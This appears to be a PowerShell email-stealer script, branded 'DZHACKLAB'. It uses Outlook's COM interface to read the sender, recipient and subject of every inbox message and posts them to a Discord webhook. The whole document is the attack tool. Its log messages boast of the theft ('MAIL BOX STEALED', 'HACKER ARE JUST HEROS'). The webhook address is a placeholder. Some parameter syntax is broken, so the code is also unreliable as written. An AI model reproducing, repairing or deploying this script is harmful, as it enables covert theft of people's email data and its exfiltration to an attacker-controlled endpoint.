
function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message " [*] START JOB ------------------- ELMO9AWIM "


Function GET-OUTLOOK-TO-DISCORD{
  Param(
  [Parameter(Mandatory=$true,Position=0)] [String[]]$BFolder
  [Parameter(Mandatory=$true,Position=1)] [String[]]$BSave
  [Parameter(Mandatory=$False,Position=2)] [String[]]$BDiscordURL,  

  )
  
  
  
  
  Write-Output "OUTLOOK BOX: $BFolder || SAVE ON $BSave { HACK FOR FUN } "

  $olFolderInbox = $BFolder
  $outlook = new-object -com outlook.application;
  $mapi = $outlook.GetNameSpace("MAPI");
  $inbox = $mapi.GetDefaultFolder($olFolderInbox)
  $STEAL = $inbox.items|Select SenderEmailAddress,to,subject|Format-Table -AutoSize 
 
  Log-Message " [*] OUTLOOK MAIL BOX STEALED ------------------- ELMO9AWIM "


  #Store webhook url
  $webHookUrl = $BDiscordURL

  #Create embed array
  [System.Collections.ArrayList]$embedArray = @()

  #Store embed values
  $title       = 'DISCORD STEALER'
  $description = 'DISCORD MAIL STEALER'
  $info        = $STEAL

  $color       = '1'

  #Create thumbnail object
  $thumbUrl = 'https://static1.squarespace.com/static/5644323de4b07810c0b6db7b/t/5aa44874e4966bde3633b69c/1520715914043/webhook_resized.png' 
  $thumbnailObject = [PSCustomObject]@{

    url = $thumbUrl

  }

  #Create embed object, also adding thumbnail
  $embedObject = [PSCustomObject]@{

    title       = $title
    description = $description
    color       = $color
    thumbnail   = $thumbnailObject
    info        = $STEAL

  }

  #Add embed object to array
  $embedArray.Add($embedObject) | Out-Null

  #Create the payload
  $payload = [PSCustomObject]@{

    embeds = $embedArray
    

  }

  #Send over payload, converting it to JSON
  Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
  
  Log-Message " [*] SEND TO DISCORD WEBHOOK ------------------- ELMO9AWIM "

  
}

Log-Message " [*] HACKER ARE JUST HEROS ------------------- ELMO9AWIM "

GET-OUTLOOK-TO-DISCORD -BFolder "6" -BSave "CVS FILE" -BDiscordURL "XXXXXXXXXXXXXXXXXXXXXXXXXXX"

